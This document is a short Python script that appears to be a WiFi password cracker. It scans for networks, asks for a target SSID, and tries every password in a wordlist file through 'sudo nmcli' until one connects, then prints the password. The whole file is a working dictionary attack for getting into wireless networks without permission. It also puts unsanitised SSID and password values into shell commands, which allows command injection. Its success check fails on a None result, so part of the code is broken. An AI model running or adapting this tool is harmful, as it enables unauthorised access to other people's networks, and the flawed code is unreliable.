#!/usr/bin/python3


import subprocess

# get passwords


def get_passwords_from_file(file_path):
    with open(file_path, "r") as f:
        passwords = f.readlines()
        f.close()
    # remove new line char from passwords
    passwords = [passw.strip() for passw in passwords]
    return passwords


def discover_wifis(iface):
    # system(f"iw dev {iface} scan | grep SSID")
    result = subprocess.run(
        [f"iw dev {iface} scan | grep SSID"], capture_output=True, encoding="UTF-8", shell=True)
    if result.stderr:
        return None, result.stderr

    ssids = [ssid.replace("\t", "").replace("SSID: ", "")
             for ssid in result.stdout.split("\n")]
    return ssids, None


def connect_to_wifi(ssid, passw):
    res = subprocess.run([f"sudo nmcli dev wifi connect {ssid} password {passw}"],
                         shell=True, capture_output=True, encoding="UTF-8")
    if res.stderr:
        return None, res.stderr
    return res.stdout, None


ssids, disc_errs = discover_wifis("wlan0")
if disc_errs:
    print(disc_errs)
else:
  # Show All Available Networks
    print("Available Wifi Nteworks : ")
    print(ssids)
    # choose ssid
    ssid = str(input("Enter Name Of SSID : "))
    passwords = get_passwords_from_file("passwords.txt")
    for password in passwords:
        print(f"Try To Connect To {ssid} With {password}....")
        conn_out, conn_err = connect_to_wifi(
            ssid=ssid, passw=password)
        if "successfully" in conn_out:
            print(f"Successfully Connected To {ssid}.")
            print(f"Password : {password}")
            break
        else:
            print("Wrong Pasword.")
